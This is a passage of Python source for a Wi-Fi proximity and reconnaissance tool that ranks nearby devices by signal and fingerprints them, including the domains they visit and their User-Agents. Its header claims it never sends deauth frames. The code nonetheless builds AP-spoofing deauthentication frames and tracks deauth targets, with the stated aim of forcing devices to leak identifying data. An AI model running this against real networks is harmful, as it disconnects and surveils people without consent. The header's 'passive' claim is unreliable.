#!/usr/bin/env python3
"""
wifi_proximity.py -- Passive Wi-Fi station proximity + recon tool.

Watches client devices ("stations") on the air using a monitor-mode Wi-Fi
adapter, ranks them by signal strength (RSSI) so the physically closest device
floats to the top of a live list, and enriches each one with as much info as
can be gathered from what is already on the air (and, optionally, from your own
host's view of the network).

This tool is PASSIVE by default. It only listens. It never transmits deauth
frames, never injects packets, and never attempts to crack keys. Use it only on
networks and devices you own or are explicitly authorized to test.

Hard dependency:  scapy        (pip install scapy)   -- packet capture/parse
Optional:         rich         (pip install rich)    -- prettier live UI
                                                         (falls back to a plain
                                                          ANSI renderer if absent)

Run  python3 wifi_proximity.py --help   for usage.
Run  python3 wifi_proximity.py --selftest   to validate the pure logic with no
hardware and no dependencies installed.
"""

import argparse
import csv
import json
import os
import re
import signal
import subprocess
import sys
import math
import sqlite3
import statistics
import threading

__version__ = "2026.09.15-5ghz+fastL3+deauth2"  # + dual-adapter smart deauth
import time
from collections import deque
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# scapy and rich are imported LAZILY (inside the functions that need them) so
# that --help, --selftest, and all the pure logic below work even when those
# packages are not installed.
# ---------------------------------------------------------------------------


# ===========================================================================
# Pure helpers (no scapy / rich needed -- these are what --selftest exercises)
# ===========================================================================

# Common OUI prefixes so *something* useful shows even with no OUI file/scapy.
# (First 3 MAC octets, upper-hex, no separators -> vendor.)
_BUILTIN_OUI = {
    "FCFBFB": "Cisco", "000C29": "VMware", "005056": "VMware",
    "001C42": "Parallels", "080027": "VirtualBox", "0050F2": "Microsoft",
    "3C5AB4": "Google", "A47733": "Google", "F4F5D8": "Google",
    "DCA632": "RaspberryPi", "B827EB": "RaspberryPi", "E45F01": "RaspberryPi",
    "D83ADD": "RaspberryPi", "2CCF67": "RaspberryPi",
    "F0D1A9": "Apple", "3C0754": "Apple", "A85C2C": "Apple", "AC87A3": "Apple",
    "F0189E": "Apple", "D0817A": "Apple", "8866A5": "Apple", "BCD074": "Apple",
    "001A11": "Google", "94EB2C": "Samsung", "5CF7E6": "Samsung",
    "F8E61A": "Samsung", "347E5C": "Sonos", "B8E937": "Sonos",
    "D052A8": "Roku", "CC6DA0": "Roku", "B0A737": "Roku",
    "18B430": "Nest", "641666": "Nest", "44650D": "Amazon",
    "FCA183": "Amazon", "68370E": "Amazon", "0C47C9": "Amazon",
    "EC1BBD": "AzureWave", "60A4B7": "Intel", "8C1645": "Intel",
    "A0C589": "Intel", "9CB6D0": "Intel", "34415D": "Intel",
    "TPLINK": "TP-Link",  # placeholder guard, never matched (6-hex keys only)
}


def normalize_mac(mac):
    """Lower-case colon-separated MAC, or None if it doesn't look like one."""
    if not mac:
        return None
    m = re.sub(r"[^0-9a-fA-F]", "", str(mac))
    if len(m) != 12:
        return None
    m = m.lower()
    return ":".join(m[i:i + 2] for i in range(0, 12, 2))


def valid_ipv4(ip):
    """Reject junk/implausible IPs so a misparse can't inject a bogus address."""
    if not ip or not isinstance(ip, str):
        return False
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    try:
        o = [int(p) for p in parts]
    except ValueError:
        return False
    if any(x < 0 or x > 255 for x in o):
        return False
    if o[0] == 0 or o[0] >= 224:            # "this network" / multicast / reserved
        return False
    if ip == "255.255.255.255":
        return False
    return True


def mac_is_multicast(mac):
    """True for broadcast/multicast MACs (least-significant bit of 1st octet)."""
    mac = normalize_mac(mac)
    if not mac:
        return False
    try:
        return bool(int(mac[0:2], 16) & 0x01)
    except ValueError:
        return False


def mac_is_locally_administered(mac):
    """True if the U/L bit is set -- i.e. a randomized/private MAC."""
    mac = normalize_mac(mac)
    if not mac:
        return False
    try:
        return bool(int(mac[0:2], 16) & 0x02)
    except ValueError:
        return False


def oui_key(mac):
    """First 3 octets as upper hex, no separators (e.g. 'B827EB'). None if bad."""
    mac = normalize_mac(mac)
    if not mac:
        return None
    return mac.replace(":", "")[:6].upper()


def freq_to_channel(freq_mhz):
    """Convert a Wi-Fi center frequency (MHz) to a channel number. None if N/A."""
    if not freq_mhz:
        return None
    f = int(freq_mhz)
    if f == 2484:
        return 14
    if 2412 <= f <= 2472:
        return (f - 2412) // 5 + 1
    if 5160 <= f <= 5885:            # 5 GHz
        return (f - 5000) // 5
    if 5955 <= f <= 7115:            # 6 GHz (Wi-Fi 6E)
        return (f - 5950) // 5
    return None


def channel_to_freq(ch):
    """Channel number -> centre frequency in MHz (2.4 / 5 / 6 GHz)."""
    if ch is None:
        return None
    ch = int(ch)
    if ch == 14:
        return 2484
    if 1 <= ch <= 13:
        return 2407 + 5 * ch
    if 32 <= ch <= 196:
        return 5000 + 5 * ch
    return None


def width_iw_args(iface, ch, width=None, center_ch=None, ht_offset=None):
    """
    Build the `iw` argument list to tune to a channel AT THE RIGHT WIDTH.

    This matters enormously: `iw set channel N` gives a 20 MHz no-HT capture,
    which decodes beacons but NOT the 40/80/160 MHz HT/VHT data frames modern
    APs actually carry traffic on. Getting the width right is the difference
    between seeing only beacons and seeing real client traffic.
    """
    freq = channel_to_freq(ch)
    if freq is None:
        return None
    if width in (80, 160) and center_ch:
        cfreq = channel_to_freq(center_ch)
        if cfreq:
            return ["iw", "dev", iface, "set", "freq", str(freq),
                    str(width), str(cfreq)]
    if width == 40 and ht_offset in ("+", "-"):
        return ["iw", "dev", iface, "set", "channel", str(ch),
                "HT40" + ht_offset]
    return ["iw", "dev", iface, "set", "channel", str(ch)]


# --- band / channel-plan helpers (5 GHz focus) -----------------------------
# 2.4 GHz: the three non-overlapping channels first, then the rest.
CHANNELS_24 = [1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10]
# 5 GHz UNII-1 + UNII-3: the channels consumer APs actually use, no radar.
CHANNELS_5_NONDFS = [36, 40, 44, 48, 149, 153, 157, 161, 165]
# 5 GHz DFS (UNII-2/2e): many adapters refuse to tune these without radar
# detection, so they're opt-in via --include-dfs.
CHANNELS_5_DFS = [52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
                  132, 136, 140, 144]

# Standard 80/160 MHz VHT channel blocks -> used to derive the center channel
# so a fixed-channel 5 GHz capture actually opens at the right width.
_VHT80_GROUPS = [
    [36, 40, 44, 48], [52, 56, 60, 64], [100, 104, 108, 112],
    [116, 120, 124, 128], [132, 136, 140, 144], [149, 153, 157, 161],
    [165, 169, 173, 177],
]
_VHT160_GROUPS = [
    [36, 40, 44, 48, 52, 56, 60, 64],
    [100, 104, 108, 112, 116, 120, 124, 128],
    [149, 153, 157, 161, 165, 169, 173, 177],
]


def band_channels(band, include_dfs=False):
    """
    Channel hop-plan for a band. '5' = 5 GHz only (what you want for a 5 GHz
    network); '2.4' = 2.4 GHz only; 'all' puts 5 GHz FIRST (so nearby 5 GHz
    devices surface fast) then 2.4 GHz. DFS 5 GHz channels are excluded unless
    include_dfs is set, because many adapters won't tune them passively.
    """
    band = str(band or "all").lower().replace("ghz", "").replace("g", "")
    five = list(CHANNELS_5_NONDFS) + (CHANNELS_5_DFS if include_dfs else [])
    if band in ("5", "5.0"):
        return five
    if band in ("2.4", "2", "24"):
        return list(CHANNELS_24)
    return five + list(CHANNELS_24)          # 'all' -> 5 GHz first


def center_channel(primary, width):
    """
    VHT center channel for the 80/160 MHz block that contains `primary`.
    e.g. center_channel(149, 80) -> 155 ; center_channel(36, 160) -> 50.
    Returns None for 20/40 MHz (they don't use a separate center channel).
    """
    if width == 80:
        groups = _VHT80_GROUPS
    elif width == 160:
        groups = _VHT160_GROUPS
    else:
        return None
    for g in groups:
        if primary in g:
            return (g[0] + g[-1]) // 2
    return None


def ht40_offset(ch):
    """
    HT40 secondary-channel offset ('+'/'-') for a 5 GHz primary channel, so a
    fixed-channel 40 MHz capture pairs correctly (36->'+', 40->'-', â€¦).
    """
    try:
        ch = int(ch)
    except (TypeError, ValueError):
        return "+"
    if 36 <= ch <= 177:
        return "+" if ((ch - 36) // 4) % 2 == 0 else "-"
    return "+"


_SPARK_CHARS = "â–â–‚â–ƒâ–„â–…â–†â–‡â–ˆ"


def sparkline(values, width=12):
    """Unicode sparkline from a list of numbers (higher value -> taller bar)."""
    vals = [v for v in values if v is not None]
    if not vals:
        return " " * width
    vals = vals[-width:]
    lo, hi = min(vals), max(vals)
    span = (hi - lo) or 1
    out = []
    for v in vals:
        idx = int(round((v - lo) / span * (len(_SPARK_CHARS) - 1)))
        out.append(_SPARK_CHARS[idx])
    return "".join(out).rjust(width)


def classify_kind(os_hint=None, hostname=None, vendor=None, model=None,
                  services=None):
    """
    Best-effort device class from passive signals: 'computer' (laptop/desktop),
    'phone' (phone/tablet), 'iot' (media/smart-home/printer), or '?' (unknown).
    Heuristic and imperfect â€” meant for filtering, not forensic certainty.
    """
    o = (os_hint or "").lower()
    h = (hostname or "").lower()
    v = (vendor or "").lower()
    m = (model or "").lower()
    s = " ".join(services or []).lower()
    text = " ".join((o, h, v, m, s))

    iot_kw = ("chromecast", "googlecast", "airplay", "roku", "sonos", "nest",
              "hue", "printer", "ipp", "pdl-datastream", "camera", "ring",
              "echo", "alexa", "espressif", "esp32", "esp8266", "tuya",
              "shelly", "smartthings", "firetv", "appletv", "kindle", "tv-",
              "smart-tv", "chromecast")
    if any(k in text for k in iot_kw):
        return "iot"

    # explicit OS hints are the strongest signal
    if "android" in o or "android-" in h or "android_" in h:
        return "phone"
    if any(k in text for k in ("iphone", "ipad", "ipod")):
        return "phone"
    if "windows" in o or "msft" in o:
        return "computer"
    if "linux" in o:
        if any(k in h for k in ("raspberry", "rpi-", "openwrt", "router",
                                "pi-hole", "pihole", "octopi")):
            return "iot"
        return "computer"
    if "darwin" in o or "macos" in o or "mac os" in o:
        return "phone" if ("iphone" in h or "ipad" in h) else "computer"

    phone_h = ("galaxy", "redmi", "poco", "oppo", "vivo", "realme", "oneplus",
               "pixel", "moto", "motorola", "xiaomi", "sm-", "huawei", "honor",
               "nokia", "infinix", "tecno", "-phone", "iphone", "ipad")
    if any(k in h for k in phone_h):
        return "phone"
    comp_h = ("desktop-", "laptop-", "-pc", "pc-", "macbook", "imac",
              "thinkpad", "latitude", "elitebook", "ideapad", "ubuntu",
              "fedora", "arch", "debian", "kali", "parrot", "win-", "dell",
              "probook", "surface", "zenbook", "vivobook", "workstation")
    if any(k in h for k in comp_h):
        return "computer"

    phone_v = ("samsung", "xiaomi", "oppo", "vivo", "realme", "oneplus",
               "motorola", "huawei", "honor")
    comp_v = ("dell", "hewlett", "hp inc", "lenovo", "asus", "acer", "msi",
              "micro-star", "intel", "gigabyte", "framework")
    if any(k in v for k in phone_v):
        return "phone"
    if any(k in v for k in comp_v):
        return "computer"
    return "?"


def frame_is_protected(fc):
    """True if the 802.11 Protected/WEP flag is set (payload is encrypted)."""
    try:
        return bool(int(fc) & 0x40)
    except Exception:
        return False


def random_laa_mac():
    """A random locally-administered, unicast MAC to use as the RTS source."""
    import random
    b = [random.randint(0, 255) for _ in range(6)]
    b[0] = (b[0] & 0xFC) | 0x02      # set LAA bit, clear multicast bit
    return ":".join("%02x" % x for x in b)


def rts_fields(target, src):
    """
    802.11 addressing for an RTS control frame used as a non-disruptive liveness
    'ping': type=1 (control), subtype=11 (RTS), addr1=target (who must answer
    with a CTS), addr2=us. A CTS reply proves the target is alive and gives a
    fresh RSSI sample â€” WITHOUT disconnecting anything. Returns a field dict or
    None. (This is a liveness/ranging probe, not a deauth/DoS.)
    """
    t = normalize_mac(target)
    s = normalize_mac(src)
    if not t or not s or mac_is_multicast(t):
        return None
    return {"type": 1, "subtype": 11, "addr1": t, "addr2": s}


def deauth_fields(target, bssid):
    """
    802.11 addressing for a deauthentication management frame:
    type=0 (management), subtype=12 (deauth), addr1=target (client to
    disconnect), addr2=bssid (spoofed AP), addr3=bssid.
    Reason code 7 = "Class 3 frame received from nonassociated STA".

    When the client receives this, it believes the AP kicked it off and
    immediately reassociates. The reassociation process forces the client
    to re-send DHCP requests, ARP, mDNS announcements, and probe requests
    â€” all of which leak IP addresses, hostnames, OS fingerprints, and
    device information even on encrypted (WPA2/WPA3) networks.

    WARNING: This is an ACTIVE attack that temporarily disconnects clients.
    Use ONLY on networks and devices you own or are explicitly authorized
    to test.

    Returns a field dict or None.
    """
    t = normalize_mac(target)
    b = normalize_mac(bssid)
    if not t or not b or mac_is_multicast(t):
        return None
    return {"type": 0, "subtype": 12, "addr1": t, "addr2": b, "addr3": b,
            "reason": 7}


def infer_association(to_ds, from_ds, a1, a2, a3, is_known_bssid=None):
    """
    Work out, for a data frame, which address is the AP (BSSID) and which is the
    client station.

    Standard 802.11 addressing:
      to-DS=1, from-DS=0  (station -> AP):  a1=BSSID, a2=station,  a3=dest
      to-DS=0, from-DS=1  (AP -> station):  a1=station, a2=BSSID,  a3=source
      to-DS=0, from-DS=0  (IBSS/ad-hoc):    a3=BSSID
      both set            (WDS/mesh):       a1=receiver

    The DS bits can be unreliable to read, so when we already know a BSSID from
    a beacon we use that to verify/repair the guess. Returns
    (bssid, station_mac, transmitter_is_ap).
    """
    if to_ds and not from_ds:
        bssid = a1
    elif from_ds and not to_ds:
        bssid = a2
    elif not to_ds and not from_ds:
        bssid = a3
    else:
        bssid = a1

    # Verify against BSSIDs learned from beacons; repair if it doesn't match.
    if is_known_bssid is not None:
        if not (bssid and is_known_bssid(bssid)):
            for cand in (a1, a2, a3):
                if cand and is_known_bssid(cand):
                    bssid = cand
                    break

    nb = normalize_mac(bssid) if bssid else None
    station = None
    if nb:
        if a2 and normalize_mac(a2) != nb:
            station = a2
        elif a1 and normalize_mac(a1) != nb:
            station = a1
    transmitter_is_ap = bool(nb and a2 and normalize_mac(a2) == nb)
    return bssid, station, transmitter_is_ap


def _percentile(values, pct):
    """Linear-interpolated percentile of a list (pct in 0..100). None if empty."""
    vals = sorted(v for v in values if v is not None)
    if not vals:
        return None
    if len(vals) == 1:
        return float(vals[0])
    k = (len(vals) - 1) * (pct / 100.0)
    lo = int(k)
    hi = min(lo + 1, len(vals) - 1)
    frac = k - lo
    return vals[lo] * (1 - frac) + vals[hi] * frac


def estimate_distance_m(rssi, tx_power=-40, path_loss_n=2.5):
    """
    Very rough free-space-ish distance estimate from RSSI (dBm).
    tx_power = expected RSSI at 1 m. This is NOISY -- treat as an order of
    magnitude only. Returns metres (float) or None.
    """
    if rssi is None:
        return None
    try:
        return round(10 ** ((tx_power - rssi) / (10.0 * path_loss_n)), 1)
    except Exception:
        return None


def parse_ip_neigh(text):
    """
    Parse `ip neigh` output into {mac: ip}. Lines look like:
      192.168.1.20 dev wlan0 lladdr aa:bb:cc:dd:ee:ff REACHABLE
    Skips entries with no lladdr or in FAILED/INCOMPLETE state.
    """
    out = {}
    for line in text.splitlines():
        parts = line.split()
        if len(parts) < 2 or "lladdr" not in parts:
            continue
        ip = parts[0]
        try:
            mac = normalize_mac(parts[parts.index("lladdr") + 1])
        except (ValueError, IndexError):
            continue
        state = parts[-1].upper()
        if mac and state not in ("FAILED", "INCOMPLETE"):
            out[mac] = ip
    return out


def parse_arp_a(text):
    """Parse BSD/macOS/Linux `arp -a` output into {mac: ip}."""
    out = {}
    for line in text.splitlines():
        m = re.search(r"\(?(\d{1,3}(?:\.\d{1,3}){3})\)?.*?"
                      r"([0-9a-fA-F]{1,2}(?::[0-9a-fA-F]{1,2}){5})", line)
        if m:
            mac = normalize_mac(m.group(2))
            if mac:
                out[mac] = m.group(1)
    return out


class OuiResolver:
    """
    Resolve a MAC to a vendor. Tries, in order:
      1. an OUI/manuf file the user supplied (--oui-file),
      2. scapy's bundled manufacturer DB (only when scapy is loaded),
      3. a small built-in table of common vendors.
    """

    def __init__(self):
        self._file_map = {}
        self._scapy_db = None
        self._cache = {}

    def load_file(self, path):
        """
        Parse a Wireshark 'manuf' file or an IEEE 'oui.txt'. Returns count loaded.
        manuf:   00:00:0C   Cisco            (also supports  /36 masks, we take /24)
        oui.txt: 00-00-0C   (hex)  CISCO SYSTEMS, INC.
        """
        n = 0
        with open(path, "r", errors="replace") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # find a MAC-prefix-looking token at the start
                m = re.match(r"([0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-]"
                             r"[0-9a-fA-F]{2})", line)
                if not m:
                    continue
                key = oui_key(m.group(1) + ":00:00:00")
                rest = line[m.end():]
                rest = re.sub(r"^\s*/\d+", "", rest)          # drop /36 mask
                rest = re.sub(r"\(hex\)", "", rest, flags=re.I)
                vendor = rest.strip().split("\t")[0].strip()
                vendor = re.split(r"\s{2,}", vendor)[0].strip()
                if key and vendor:
                    self._file_map[key] = vendor
                    n += 1
        return n

    def attach_scapy(self, scapy_conf):
        self._scapy_db = scapy_conf

    def lookup(self, mac):
        if mac_is_locally_administered(mac):
            return "(randomized MAC)"
        key = oui_key(mac)
        if not key:
            return "?"
        if key in self._cache:
            return self._cache[key]
        vendor = self._file_map.get(key)
        if not vendor and self._scapy_db is not None:
            try:
                v = self._scapy_db.manufdb._get_manuf(mac)
                if v and v not in ("UnknownVendor", mac):
                    vendor = v
            except Exception:
                pass
        if not vendor:
            vendor = _BUILTIN_OUI.get(key)
        vendor = vendor or "?"
        self._cache[key] = vendor
        return vendor


# ===========================================================================
# Station model + thread-safe tracker
# ===========================================================================

class Station:
    """One tracked transmitter (client station, or an AP if --show-aps)."""

    __slots__ = ("mac", "ema_rssi", "last_rssi", "recent", "samples",
                 "first_seen", "last_seen", "packets", "channels", "bssid",
                 "ssids", "is_ap", "vendor", "ip", "hostname", "fingerprint",
                 "network",
                 # --- richer passive enrichment (open-network freebies) ---
                 "os_hint", "model", "services", "dhcp_fp", "nbios",
                 "domains", "user_agent",
                 # --- radio params learned from beacons (HT/VHT operation) ---
                 "width", "center_ch", "ht_offset", "security", "lock",
                 # --- extras: weak OS hint, IPv6, probe fp, per-adapter RSSI ---
                 "os_guess", "ip6", "probe_fp", "iface_rssi", "kalman")

    def __init__(self, mac, ema_alpha_placeholder=None, lock=None):
        # Shared with the Tracker so the capture thread (writing samples) and
        # the UI thread (reading them) can never touch the deque at once.
        self.lock = lock or threading.RLock()
        self.mac = mac
        self.ema_rssi = None
        self.last_rssi = None
        self.recent = deque(maxlen=40)
        self.samples = deque(maxlen=600)   # (timestamp, rssi) for robust stats
        self.first_seen = time.time()
        self.last_seen = self.first_seen
        self.packets = 0
        self.channels = set()
        self.bssid = None
        self.ssids = set()          # probed / associated SSIDs
        self.is_ap = False
        self.vendor = None
        self.ip = None
        self.hostname = None
        self.fingerprint = None     # e.g. OS/device hint
        self.network = None         # SSID string for display
        self.os_hint = None         # DHCP vendor-class / SSDP server / WPS mfr
        self.model = None           # mDNS TXT model / WPS model / SSDP device
        self.services = set()       # mDNS/SSDP service types (airplay, castâ€¦)
        self.dhcp_fp = None         # DHCP option-55 parameter-request signature
        self.nbios = None           # NetBIOS (Windows) name
        self.domains = set()        # DNS queries + TLS SNI (who it talks to)
        self.user_agent = None      # plaintext HTTP User-Agent
        self.width = None           # 20/40/80/160 MHz (APs, from beacon IEs)
        self.center_ch = None       # VHT center channel
        self.ht_offset = None       # '+' or '-' for HT40
        self.security = None        # OPEN / OWE / WPA2 / WPA3 â€¦ (APs)
        self.os_guess = None        # weak OS hint (TTL) â€” used only if no os_hint
        self.ip6 = None             # an observed global IPv6 address
        self.probe_fp = None        # 802.11 probe-request IE signature
        self.iface_rssi = {}        # adapter name -> last RSSI (for location)
        self.kalman = None          # (estimate, variance) for --rank-by kalman

    def best_device(self):
        """One short human label for the DEVICE column."""
        if self.model:
            return self.model
        if self.os_hint:
            return self.os_hint
        if self.os_guess:
            return self.os_guess
        if self.services:
            return "+".join(sorted(self.services)[:2])
        if self.nbios:
            return self.nbios
        return ""

    def update_rssi(self, rssi, alpha, iface=None):
        if rssi is None:
            return
        with self.lock:
            self.last_rssi = rssi
            self.recent.append(rssi)
            self.samples.append((time.time(), rssi))
            if self.ema_rssi is None:
                self.ema_rssi = float(rssi)
            else:
                self.ema_rssi = alpha * rssi + (1 - alpha) * self.ema_rssi
            self.kalman = kalman_step(self.kalman, rssi)
            if iface:
                self.iface_rssi[iface] = rssi

    def loudest_iface(self):
        """Adapter that currently hears this device strongest (location hint)."""
        with self.lock:
            if not self.iface_rssi:
                return None
            return max(self.iface_rssi.items(), key=lambda kv: kv[1])[0]

    def _recent(self, window_s):
        # MUST hold the lock: the capture thread appends here while the UI
        # thread reads, and a bounded deque drops from the left as it appends
        # -> "deque mutated during iteration" without this.
        with self.lock:
            if not self.samples:
                return []
            if not window_s:
                return [r for _, r in self.samples]
            cutoff = time.time() - window_s
            vals = [r for t, r in self.samples if t >= cutoff]
            return vals if vals else [self.samples[-1][1]]  # never fully empty

    def recent_list(self):
        """Thread-safe copy of the recent RSSI values (for the sparkline)."""
        with self.lock:
            return list(self.recent)

    def channels_list(self):
        with self.lock:
            return sorted(self.channels)

    def ssids_list(self):
        with self.lock:
            return sorted(self.ssids)

    def services_list(self):
        with self.lock:
            return sorted(self.services)

    def sample_count(self, window_s=None):
        return len(self._recent(window_s))

    def best_device_safe(self):
        with self.lock:
            return self.best_device()

    def kind(self):
        with self.lock:
            return classify_kind(self.os_hint or self.os_guess, self.hostname,
                                 self.vendor, self.model, self.services)

    def rank_value(self, kind="median", window_s=None):
        """Robust proximity estimate (dBm). Higher = closer."""
        vals = self._recent(window_s)
        if not vals:
            return None
        if kind == "ema":
            return self.ema_rssi
        if kind == "mean":
            return sum(vals) / len(vals)
        if kind == "max":
            return max(vals)
        if kind == "p80":
            return _percentile(vals, 80)
        return statistics.median(vals)          # default: median (robust)

    def spread(self, window_s=None):
        """RSSI spread (p90-p10) in dB â€” a stability / confidence indicator."""
        vals = self._recent(window_s)
        if len(vals) < 3:
            return None
        return _percentile(vals, 90) - _percentile(vals, 10)

    def weighted_rssi(self, half_life=6.0):
        """
        Recency-weighted mean RSSI: recent samples count more (exponential
        decay, `half_life` seconds). Reacts within a few seconds when a device
        moves, while still averaging out per-packet noise â€” the sweet spot
        between a raw last-reading (jumpy) and a long median (sluggish).
        """
        with self.lock:
            if not self.samples:
                return None
            now = time.time()
            tau = (half_life / 0.6931471805599453) if half_life and half_life > 0 else None
            num = den = 0.0
            for t, r in self.samples:
                w = math.exp(-(now - t) / tau) if tau else 1.0
                num += w * r
                den += w
            return (num / den) if den > 0 else None

    def estimate(self, rank_by, window_s, half_life):
        """The value used for BOTH ranking and the RSSI column, so they agree."""
        if rank_by == "weighted":
            return self.weighted_rssi(half_life)
        if rank_by == "kalman":
            with self.lock:
                return self.kalman[0] if self.kalman else None
        return self.rank_value(rank_by, window_s)

    def touch(self, channel=None):
        with self.lock:
            self.last_seen = time.time()
            self.packets += 1
            if channel:
                self.channels.add(channel)

    @property
    def age(self):
        return time.time() - self.last_seen


class Tracker:
    """Holds all stations. Every public method is safe to call from threads."""

    def __init__(self, alpha=0.3, rank_by="weighted", window_s=30,
                 min_samples=4, half_life=6.0):
        self.alpha = alpha
        self.rank_by = rank_by      # weighted (default) / median / ema / p80 / max
        self.window_s = window_s    # window for median/mean/spread/sample-count
        self.half_life = half_life  # recency half-life (s) for 'weighted'
        self.min_samples = min_samples   # below this, RSSI shows a '?' (display only)
        self._lock = threading.RLock()
        self.stations = {}          # mac -> Station
        self.bssid_ssid = {}        # bssid -> ssid  (from beacons)
        self.ip_to_host = {}        # ip -> hostname (from any source)
        self.total_frames = 0
        self.start = time.time()
        self.errors = []           # capture-thread errors, surfaced on exit
        self.lock_info = None      # (bssid, channel, rssi) when locked to an AP
        self.ftypes = {0: 0, 1: 0, 2: 0}   # mgmt / control / DATA frame counts
        self.bssid_data = {}               # bssid -> data-frame count (activity)
        self.diag = {"tods": 0, "fromds": 0, "wds": 0,   # data-frame X-ray
                     "cli_uni": 0, "cli_mc": 0, "cli_target": 0}
        self.pings = 0                     # RTS liveness probes sent (--ping-clients)
        self.deauths = 0                   # deauth frames sent (--deauth)
        self.deauth_log = {}               # mac -> timestamp of last deauth

    def note_data(self, bssid):
        """Count a data frame seen on an AP â€” a proxy for client activity."""
        b = normalize_mac(bssid) if bssid else None
        if b:
            with self._lock:
                self.bssid_data[b] = self.bssid_data.get(b, 0) + 1

    def set_radio(self, mac, width=None, center_ch=None, ht_offset=None):
        """Record an AP's channel width so we can capture at the right width."""
        mac = normalize_mac(mac)
        with self._lock:
            st = self.stations.get(mac)
            if not st:
                return
            if width:
                st.width = width
            if center_ch:
                st.center_ch = center_ch
            if ht_offset:
                st.ht_offset = ht_offset

    def set_security(self, mac, sec):
        mac = normalize_mac(mac)
        with self._lock:
            st = self.stations.get(mac)
            if st and sec:
                st.security = sec

    def security_unknown(self, mac):
        """True if we track this AP but haven't classified its security yet.
        Lock-safe replacement for poking tracker.stations[...] from the
        capture thread (which could KeyError on a station observe() skipped)."""
        mac = normalize_mac(mac)
        with self._lock:
            st = self.stations.get(mac)
            return bool(st and st.security is None)

    def log_deauth(self, mac):
        """Record that we just deauthed this MAC (thread-safe)."""
        mac = normalize_mac(mac)
        if mac:
            with self._lock:
                self.deauth_log[mac] = time.time()

    def needs_enrichment(self, mac):
        """True if a station is missing hostname AND ip AND os_hint â€” i.e. we
        know almost nothing about it and a reassociation would help."""
        mac = normalize_mac(mac)
        with self._lock:
            st = self.stations.get(mac)
            if not st:
                return False
            return not st.hostname and not st.ip and not st.os_hint

    def deauth_due(self, mac, cooldown):
        """True if this MAC hasn't been deauthed within `cooldown` seconds."""
        mac = normalize_mac(mac)
        with self._lock:
            last = self.deauth_log.get(mac)
            if last is None:
                return True
            return (time.time() - last) >= cooldown

    def security_for_ssid(self, ssid):
        """Best-known security label across the APs advertising this SSID."""
        with self._lock:
            for b in self.bssids_for_ssid(ssid):
                st = self.stations.get(b)
                if st and st.security:
                    return st.security
        return None

    def radio_for(self, mac):
        """(width, center_ch, ht_offset) for an AP, or (None, None, None)."""
        mac = normalize_mac(mac)
        with self._lock:
            st = self.stations.get(mac)
            if not st:
                return (None, None, None)
            return (st.width, st.center_ch, st.ht_offset)

    def _get(self, mac):
        st = self.stations.get(mac)
        if st is None:
            # share the tracker's RLock so readers/writers can't race
            st = Station(mac, lock=self._lock)
            self.stations[mac] = st
        return st

    def observe(self, mac, rssi=None, channel=None, is_ap=None,
                bssid=None, ssid=None, iface=None):
        mac = normalize_mac(mac)
        if not mac or mac_is_multicast(mac):
            return
        with self._lock:
            self.total_frames += 1
            st = self._get(mac)
            st.update_rssi(rssi, self.alpha, iface=iface)
            st.touch(channel)
            if is_ap is True:
                st.is_ap = True
            if bssid:
                b = normalize_mac(bssid)
                if b and not mac_is_multicast(b):
                    st.bssid = b
                    if b in self.bssid_ssid:
                        st.network = self.bssid_ssid[b]
            if ssid:
                st.ssids.add(ssid)
                if not st.network:
                    st.network = ssid

    def bssids_for_ssid(self, ssid):
        """All BSSIDs (APs, incl. mesh/repeaters) advertising this SSID
        (case-insensitive, whitespace-trimmed)."""
        want = (ssid or "").strip().casefold()
        with self._lock:
            return {b for b, s in self.bssid_ssid.items()
                    if (s or "").strip().casefold() == want}

    def channels_for_ssid(self, ssid):
        """Channels those APs live on â€” used to narrow (speed up) the sweep."""
        want = (ssid or "").strip().casefold()
        with self._lock:
            chans = set()
            for b, s in self.bssid_ssid.items():
                if (s or "").strip().casefold() == want:
                    st = self.stations.get(b)
                    if st:
                        chans |= st.channels
            return chans

    def strongest_ap_for_ssid(self, ssid):
        """
        The AP of this network we hear best = the one we're physically nearest.
        Returns (bssid, channel, rssi) or None. Used to lock the radio to that
        channel, which is where the devices near us will be.
        """
        best = None
        with self._lock:
            for b in self.bssids_for_ssid(ssid):
                st = self.stations.get(b)
                if not st or not st.channels:
                    continue
                rv = st.rank_value(self.rank_by, self.window_s)
                if rv is None:
                    continue
                ch = sorted(st.channels)[-1]
                if best is None or rv > best[2]:
                    best = (b, ch, rv)
        return best

    def best_ap_for_ssid(self, ssid):
        """
        Pick the AP to camp on: prefer the one with the MOST client data
        (that's where devices actually are), breaking ties by signal. Falls back
        to the strongest AP when nobody's transmitting yet. Returns
        (bssid, channel, rssi, data_count) or None.
        """
        best = None
        best_key = None
        with self._lock:
            for b in self.bssids_for_ssid(ssid):
                st = self.stations.get(b)
                if not st or not st.channels:
                    continue
                rv = st.rank_value(self.rank_by, self.window_s)
                dc = self.bssid_data.get(b, 0)
                ch = sorted(st.channels)[-1]
                key = (dc, rv if rv is not None else -999)
                if best_key is None or key > best_key:
                    best_key = key
                    best = (b, ch, rv if rv is not None else -999, dc)
        return best

    def count_associated(self, ssid):
        """How many client stations we've confirmed are on this network."""
        targets = self.bssids_for_ssid(ssid)
        with self._lock:
            return sum(1 for s in self.stations.values()
                       if not s.is_ap and s.bssid in targets)

    def is_known_bssid(self, mac):
        """True if we've seen a beacon/probe-response from this MAC."""
        mac = normalize_mac(mac)
        if not mac:
            return False
        with self._lock:
            return mac in self.bssid_ssid

    def seen_ssids(self):
        """All non-hidden network names seen in beacons (for diagnostics)."""
        with self._lock:
            return sorted({s for s in self.bssid_ssid.values() if s})

    def register_bssid(self, bssid, ssid):
        bssid = normalize_mac(bssid)
        if bssid and ssid:
            with self._lock:
                self.bssid_ssid[bssid] = ssid
                # backfill any stations already associated to this BSSID
                for st in self.stations.values():
                    if st.bssid == bssid and not st.network:
                        st.network = ssid

    def set_info(self, mac=None, ip=None, hostname=None, os_hint=None,
                 model=None, service=None, dhcp_fp=None, nbios=None,
                 domain=None, user_agent=None, os_guess=None, ip6=None,
                 probe_fp=None):
        """
        Attach anything learned about a device (by MAC when known, else by IP)
        to the right station. Scalar fields only fill if empty (first/best wins,
        except hostname/model which upgrade to a better value); set-valued
        fields accumulate.
        """
        # drop implausible IPs so a misparse can't inject a bogus address
        if ip and not valid_ipv4(ip):
            ip = None
        with self._lock:
